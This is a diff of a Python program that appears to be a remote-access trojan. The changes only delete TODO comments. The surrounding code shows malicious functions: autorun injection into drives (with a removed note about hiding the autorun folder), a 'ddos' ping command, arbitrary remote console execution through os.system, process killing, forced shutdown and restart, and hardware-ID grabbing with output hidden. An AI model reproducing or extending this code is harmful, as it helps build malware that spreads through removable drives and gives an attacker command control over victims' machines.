@@ -288,8 +288,6 @@ def save_name() -> None:
 def drive_inject_autorun_executable(drive: str) -> None:
     """ Injects autorun executable. """
 
-    # TODO: Make autorun folder hidden.
-
     if not FEATURE_DRIVES_INJECTION_ENABLED:
         # If injection is disabled.
 
@@ -784,7 +782,6 @@ def command_cd(arguments, _) -> CommandResult:
         # Remove last.
         path_directories.pop(-1)
 
-        # TODO: Fix root error (С: without trailing slash).
         if len(path_directories) <= 1:
             # If last (like C:\\)
 
@@ -929,7 +926,6 @@ def command_ddos(arguments, _) -> CommandResult:
             timeout = arguments[1]
 
             # Pinging from admin.
-            # TODO. Disable console output.
             console_response = os.system(f"ping -c {address} {timeout}")
 
             if console_response == SYSTEM_OK_STATUS_CODE:
@@ -940,7 +936,6 @@ def command_ddos(arguments, _) -> CommandResult:
             return CommandResult(f"DDoS ping returned non-zero exit code {console_response}! (Admin) (Access Denied?)")
 
         # Pinging from user.
-        # TODO. Disable console output.
         console_response = os.system(f"ping {address}")
 
         if console_response == SYSTEM_OK_STATUS_CODE:
@@ -1002,8 +997,6 @@ def command_link(arguments, _) -> CommandResult:
             pass
 
     # Opening with system.
-    # TODO: Linux=open, Windows=start
-    # TODO. Disable console output.
     console_response = os.system(f"start {arguments[0]}")
 
     if console_response == SYSTEM_OK_STATUS_CODE:
@@ -1043,7 +1036,6 @@ def command_taskkill(arguments, _) -> CommandResult:
     """ Command `taskkill` that kills task. """
 
     # Call console.
-    # TODO. Disable console output.
     console_response = os.system(f"taskkill /F /IM {arguments}")
 
     # Executing system and returning result.
@@ -1060,7 +1052,7 @@ def command_taskkill(arguments, _) -> CommandResult:
 def command_upload(*_) -> CommandResult:
     """ Command `upload` that uploads file to the client. """
 
-    # Error. TODO.
+    # Error.
     return CommandResult("Not implemented yet!")
 
 
@@ -1167,7 +1159,6 @@ def command_shutdown(*_) -> CommandResult:
     """ Command `shutdown` that shutdown system. """
 
     # Shutdown.
-    # TODO. Disable console output.
     os.system("shutdown /s /t 0")
 
     # Message.
@@ -1222,7 +1213,6 @@ def command_restart(*_) -> CommandResult:
     """ Command `restart` that restarts system. """
 
     # Restarting.
-    # TODO. Disable console output.
     os.system("shutdown /r /t 0")
 
     # Message.
@@ -1233,7 +1223,6 @@ def command_console(arguments, _) -> CommandResult:
     """ Command `console` that executing console. """
 
     # Call console.
-    # TODO. Disable console output.
     console_response = os.system(arguments)
 
     # Executing system and returning result.
@@ -2101,7 +2090,6 @@ def get_hwid() -> str:
 
         # Opening process.
         with open("NUL", "w", encoding="UTF-8") as void_file:
-            # TODO. When there is DEBUG flag, not write to file.
             # That file is disables console out.
             process = subprocess.Popen(hwid_grab_command, shell=True, stdin=void_file, stdout=void_file,
                                        stderr=void_file)
